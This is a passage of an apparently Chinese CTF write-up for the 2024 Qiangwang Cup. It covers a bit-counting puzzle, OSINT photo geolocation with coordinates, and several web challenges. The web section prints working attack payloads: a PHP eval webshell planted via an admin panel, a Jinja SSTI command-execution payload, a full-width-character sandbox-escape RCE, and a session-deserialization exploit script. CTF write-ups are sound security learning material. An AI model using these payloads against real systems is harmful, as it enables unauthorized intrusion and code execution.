A &amp; <span class="number">127</span>  <span class="comment"># 0x7f</span></span><br><span class="line">    operations.append(<span class="string">f&quot;A=A&amp;127;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> A, operations</span><br><span class="line"></span><br><span class="line">A = random.randrange(<span class="number">0</span>, <span class="number">2</span>**<span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Original number (A): <span class="subst">&#123;A&#125;</span>&quot;</span>)</span><br><span class="line">weight, operations = calculate_weight(A)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Binary weight of A (number of 1&#x27;s): <span class="subst">&#123;weight&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出指定格式的结果</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join(operations)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Result:&quot;</span>, result)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t1an@LAPTOP-A8BOAIJO:~$ nc 47.93.99.173 22773</span><br><span class="line">Can you weight a 128 bits number in 21 steps</span><br><span class="line">B=A&gt;&gt;1;B=B&amp;113427455640312821154458202477256070485;A=A-B;B=A&amp;68056473384187692692674921486353642291;A=A&gt;&gt;2;A=A&amp;68056473384187692692674921486353642291;A=A+B;B=A&gt;&gt;4;A=A+B;A=A&amp;20016609818878733144904388672456953615;B=A&gt;&gt;8;A=A+B;B=A&gt;&gt;16;A=A+B;B=A&gt;&gt;32;A=A+B;B=A&gt;&gt;64;A=A+B;A=A&amp;127;</span><br><span class="line">flag&#123;you_can_weight_it_in_21_steps!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>复制粘贴</p>
<h3 id="givemesecret"><a href="#givemesecret" class="headerlink" title="givemesecret"></a>givemesecret</h3><p>使用你所知道的{}后半部分的前64个字符并以base64编码输出</p>
<h3 id="Master-of-OSINT"><a href="#Master-of-OSINT" class="headerlink" title="Master of OSINT"></a>Master of OSINT</h3><h4 id="一-、"><a href="#一-、" class="headerlink" title="一 、"></a>一 、</h4><p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/422488f29d2c681857e2e52617ffbab8.png"><br>放大发现图片尽头有一部分湖，同时根据地理特称，草原。<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/f18c3f0c4547c8c6a2692057e419e985.png"><br>另一边放大发现是山峰，同时地理特称也是草原，由此推测地点可能是内蒙古或者青海。<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/11de63f16ffebf352414b16ae38860ba.png"><br>此时地图上较大的湖泊只有青海湖，定位到青海湖，百度地图绕一圈观察全景地图发现<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/01022457ce17ee94744f24df24842cca.png"><br>此时十分相似，取点，多次尝试后发现一点<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6d7ad3b5202ca8f312cd97439e3465cc.png"><br>99.972996,36.667459，此点通过</p>
<h4 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h4><p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/026eef010e83bf80300c89c96312b70b.png"><br>此时放大图片发现“百安居”“迪卡侬”字样，<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/beabedf09db1691806bef2b6c6391f1d.png"><br>小红书第一张，此时根据作者定位发现是在上海，搜索上海的百安居和迪卡侬，多次筛选<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/061841ed5a27f8ac4a7193bcd9892650.png"><br>上海共和新路店<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/0b9605340670a068dd34a5b6f999d1ee.png"><br>根据图片估算大概位置尝试，通过<br>121.569689,31.211024</p>
<h4 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h4><p>目标明确<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/aea5827cbd12a9186ba39ecb57fe64dd.png"><br>可以看到类似于机场的建筑，抖音搜索机场，突然发现一个机场“双流机场”，建筑物相同，接下来去地图取点<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/5aafd82ed59a6cd9939d61d3df179c25.png"><br>根据图片位置取点，多次尝试，通过<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/8680725a5649db49dd28fdfa02607086.png"><br>103.966747,30.571144</p>
<h4 id="四、"><a href="#四、" class="headerlink" title="四、"></a>四、</h4><p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/d61e37c0b7d24b69837faadb8d64d382.png"><br>辨识度较低，但仍可以辨识出IK””A，根据搜索可知大概率为宜家家居IKEA，同时路况应该是高速，<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/79c0af720c41b42bcea82e9d2e5ee856.png"><br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/be4f79fea875cff217a263311aa86a29.png"><br>浙江省杭州市临平区有一处为高速且有宜家家居，根据地图位置开始取点，<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/72137578a280d13e030ec52cfd7a7b1a.png"><br>120.293233,30.346318</p>
<h4 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h4><p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/9eb140e7f758b9220df8a07ad4e132a3.png"><br>轻轨首先定位重庆，再根据抖音视图，可以确认重庆<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/d3b8946e2a66c168a4204fc7f04b7b99.png"><br>隐约发现了一座类似于桥的建筑，抖音搜索发现应该是鹅公岩大桥，根据图片方位，由此推测，发现应该是位于万象城附近<br>附近街道进入全景识图开始搜索<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/cb983b2fb43bc69dadb8c2637f6a68dd.png"><br>发现相似位置<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/7cce39b65b7d20ba4020f8d78ec6a461.png"><br>106.524033,29.52509</p>
<h4 id="六、"><a href="#六、" class="headerlink" title="六、"></a>六、</h4><p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/7599130e4d18339cb931219923e44a12.png"><br>标志性物质，建筑风格特殊，根据特殊的塔形并且抖音给出的提示可猜测为大报恩寺<br>根据方位从赛虹桥立交桥开始查起，根绝全景地图一点点查吧<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/7d41c9e2e0d02f0b8e767985d0d8dd88.png"><br>找到具体位置，定位坐标，尝试<br>118.783702,32.013327</p>
<h4 id="七、"><a href="#七、" class="headerlink" title="七、"></a>七、</h4><p>又是一座桥，但是中间有一块陆地，而且估计是著名地点<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/3c83b3b35db916589755512762cf70c7.jpg"><br>抖音识图直接出了，长沙橘子洲大桥。坐标取中间一点点试<br>112.969485,28.201594</p>
<h4 id="八、"><a href="#八、" class="headerlink" title="八、"></a>八、</h4><p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6afbeabdb6cfd8c12778aaa6aa4e68a4.png"><br>桥头模糊有两个大立柱，且桥身弯曲，且向上隆起<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/29a48d711750a8fa1f7f7d52e6f85860.png"><br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/28c0e51653cfc697d0e688163acd7d8d.png"><br>歪打正着，剩的就是尝试坐标了<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/0ac76df0df7cb7fdac193c4dc11da230.png"><br>121.734931,31.412538</p>
<h4 id="九、"><a href="#九、" class="headerlink" title="九、"></a>九、</h4><p><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/465de9349af0810da54409adaa765f16.png"><br>图九和图八歪打正着正好刚看完，武汉天兴洲长江大桥<br>继续定位找坐标了<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/ba5467ca2a83f85d681f5f80a5b2380f.png"><br>114.41086,30.664364</p>
<h4 id="十、"><a href="#十、" class="headerlink" title="十、"></a>十、</h4><p>头顶类似于高铁应该是高铁线路<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/9ed0304dd7a3b90c9999a0b1df611a51.png"><br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/60eb7b4759e72f1aed5103b64f812e60.png"><br>左下角“”泰百货，但具体不清楚，著名的商场之类的只有“银泰百货”地图搜索银泰百货，发现结果很多，根据地形特点，应该归属于平原一类，<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/e6b564709a0212e542490c00bde670f1.png"><br>大概属于此区域内，剩的就是一点点进行排查了且附近有高铁线路，最后排查到杭州时发现有一处合适，<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/4b32b60ac50ec3cc79e8b85d7916d2e6.png"><br>此时图内位于高铁下选点，尝试即可<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/5dd8880a2f51bc7282e56b1b80a6493f.png"><br>120.308658,30.152746</p>
<h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>填完即可获得flag</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a>xiaohuanxiong</h3><p>访问进界面后跟随步骤安装即可<br>后面没有思路了，直接dir开扫</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[10:15:29] 200 -   1KB - /register.html                                     </span><br><span class="line">[10:15:30] 200 -   24B - /robots.txt                                       </span><br><span class="line">[10:15:31] 200 -   2KB - /search                                           </span><br><span class="line">[10:15:31] 200 -   2KB - /search.php                                       </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>时间较长，稍候就会发现admin目录，再扫会发现admin&#x2F;admins目录，直接访问到管理员后台，然后增加管理员账号asd asd，返回登陆界面进行登录。过一遍发现没什么漏洞，然后点进支付后台，可以看到可以加进php代码，直接导入一句话木马，删除之前的内容导入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>返回到主页利用Hackbar进行Post传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attack=system(&#x27;cat /f&#x27;);</span><br></pre></td></tr></table></figure>

<p>即可得到flag</p>
<h3 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h3><p>好抽象的贪吃蛇，首先根据路由爆破得到&#x2F;snake_win</p>
<p>开始考虑是什么漏洞<br>首先测试sql注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zed2ka6j5axcvrdak5f.cloudeci1.ichunqiu.com:5000/snake_win?username=1%27%20union%20select%201,2,(2000)--+</span><br></pre></td></tr></table></figure>

<p>但是并没有什么可以利用的，这时候只能考虑ssti了<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/6a6cde1e3eaf04849a955da162c87ba2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zed2ka6j5axcvrdak5f.cloudeci1.ichunqiu.com:5000/snake_win?username=1%27union%20select%201,2,%22&#123;&#123;lipsum.__globals__.__builtins__&#125;&#125;%22--+</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zed2ka6j5axcvrdak5f.cloudeci1.ichunqiu.com:5000/snake_win?username=1&#x27;union2&quot; &#123;&#123;lipsum.__globals__.__builtins__.eval(&#x27;__import__(\&#x27;os\&#x27;).popen(\&#x27;tac/flag\&#x27;).read()&#x27;)&#125;&#125;&quot;--+</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h3 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h3><p>审计一下发现讲那么多也就一个do方法能够有用<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/81ce481aed80b364cdd762a059070069.png"><br>这里有个注意的点就是长度不能超过四，那我们等会重写函数就可以了，OK寻找注入点<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/82651994f2774ed4ab4bbc2170fe8414.png"></p>
<p>这里就是把绕过的恶意代码进行绕过</p>
<p>这里英文基本上都用不了了，不过查找资料发现可以使用半角符号绕过，这里写个脚本进行转字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">half2full</span>(<span class="params">half</span>):    full = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> half:  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):  <span class="comment"># ASCII可显示字符（33到126）            ch = chr(ord(ch) + 0xfee0)  # 半角转全角        elif ord(ch) == 32:  </span></span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="number">0x3000</span>)  <span class="comment"># 半角空格转全角空格        # 如果不是可转换的字符，保持原样        full += ch  </span></span><br><span class="line">    <span class="keyword">return</span> full  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 初始化字符串t = &#x27;&#x27;  </span></span><br><span class="line">s = <span class="string">&quot;1&quot;</span>  <span class="comment"># 字符串可以自定义# 转换每个字符for i in s:  </span></span><br><span class="line">    t += half2full(i)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 打印结果  </span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>

<p>这里就是RCE的构造了，读取文件的姿势有很多，不过经过测试，发现这里只有dd这个命令有权限能够读取文件</p>
<p>dd if&#x3D;&#x2F;flag</p>
<p>命令写好之后我们还要注意的就是之前分析好的点，重写len函数</p>
<p>len&#x3D;lambda a:4</p>
<p>不过我们审计代码的时候是知道符号都用不了了，这里测试之后发现汉字符号可以被正常解析为英文符号</p>
<p>写出poc</p>
<p>‘；＿＿import＿＿（”builtins”）。len＝lambda a：4；’‘；＿＿import＿＿（”os”）。system（”＄（printf ‘ｄｄ　ｉｆ＝／ｆｌａｇ’）； ”）；’</p>
<p>然后做题的话就有个小技巧了，把第一个方块先拖进去，然后再输入payload发包即可，我最开始一直是放payload再拖然后再发包，哎，一直不成功，最后的poc<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/f0ae3a7566f5ec658b76279fa63cb13c.png"></p>
<h3 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h3><p>有代码，先审计一下<br><img src="/2024/11/29/2024%E5%BC%BA%E7%BD%91%E6%9D%AF/33aca511e2a909003d2a656b40ce76f4.png"><br>一进来就看到了字符置换，这又本来就是一个session的反序列化，我们找黑名单为</p>
<p>private $sensitiveFunctions &#x3D; [‘system’, ‘eval’, ‘exec’, ‘passthru’, ‘shell_exec’, ‘popen’, ‘proc_open’];</p>
<p>那么也就是利用这些字符串来逃逸字符的</p>
<p>经过多次的测试发现字符数始终为56</p>
<p>print(len(‘“;session_key|s:20:”n5ZHGZG4jziGTulYLSEg”;password|s:99:’))</p>
<p>写出逃逸的字符串</p>
<p>print(“popen”*10+”system”)</p>
<p>当然这里有session的认证，所以我们把http头带上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">headers = &#123;  </span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;Proxy-Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&#x27;</span>,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">params = &#123;  </span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&quot;ls /&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">data = &#123;  </span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;;session_key|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:24:&quot;(&quot;sys&quot;.&quot;tem&quot;)($_GET[t]);&quot;;&#125;password|s:4:&quot;T1ng&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;popenpopenpopenpopenpopenpopenpopenpopenpopenpopensystem&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&quot;http://eci-2zeg97hlr4shwyxd7pnc.cloudeci1.ichunqiu.com/&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">    r = requests.session()  </span><br><span class="line">  </span><br><span class="line">    response1 = r.post(url + <span class="string">&#x27;/index.php&#x27;</span>, headers=headers, data=data, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)  </span><br><span class="line">    response2 = r.post(url + <span class="string">&#x27;/index.php&#x27;</span>, headers=headers, data=data, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)  </span><br><span class="line">  </span><br><span class="line">    response3 = r.post(url + <span class="string">&#x27;/dashboard.php&#x27;</span>, params=params, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response3.text:  </span><br><span class="line">        <span class="built_in">print</span>(response3.text)  </span><br><span class="line">        <span class="built_in">print</span>(r.cookies)  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="built_in">print</span>(response3.text)  </span><br><span class="line">        <span class="built_in">print</span>(r.cookies)  </span><br><span class="line">  </span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure>

<h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ProxyRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">	URL             <span class="type">string</span>            <span class="string">`json:&quot;url&quot; binding:&quot;required&quot;`</span></span><br><span class="line">	Method          <span class="type">string</span>            <span class="string">`json:&quot;method&quot; binding:&quot;required&quot;`</span></span><br><span class="line">	Body            <span class="type">string</span>            <span class="string">`json:&quot;body&quot;`</span></span><br><span class="line">	Headers         <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;headers&quot;`</span></span><br><span class="line">	FollowRedirects <span class="type">bool</span>              <span class="string">`json:&quot;follow_redirects&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line"></span><br><span class="line">	v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">			flag, err := cmd.CombinedOutput()</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	v2 := r.Group(<span class="string">&quot;/v2&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		v2.POST(<span class="string">&quot;/api/proxy&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			<span class="keyword">var</span> proxyRequest ProxyRequest</span><br><span class="line">			<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			client := &amp;http.Client&#123;</span><br><span class="line">				CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">					<span class="keyword">if</span> !req.URL.IsAbs() &#123;</span><br><span class="line">						<span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> !proxyRequest.FollowRedirects &#123;</span><br><span class="line">						<span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class="type">byte</span>(proxyRequest.Body)))</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> key, value := <span class="keyword">range</span> proxyRequest.Headers &#123;</span><br><span class="line">				req.Header.Set(key, value)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">			body, err := io.ReadAll(resp.Body)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			c.Status(resp.StatusCode)</span><br><span class="line">			<span class="keyword">for</span> key, value := <span class="keyword">range</span> resp.Header &#123;</span><br><span class="line">				c.Header(key, value[<span 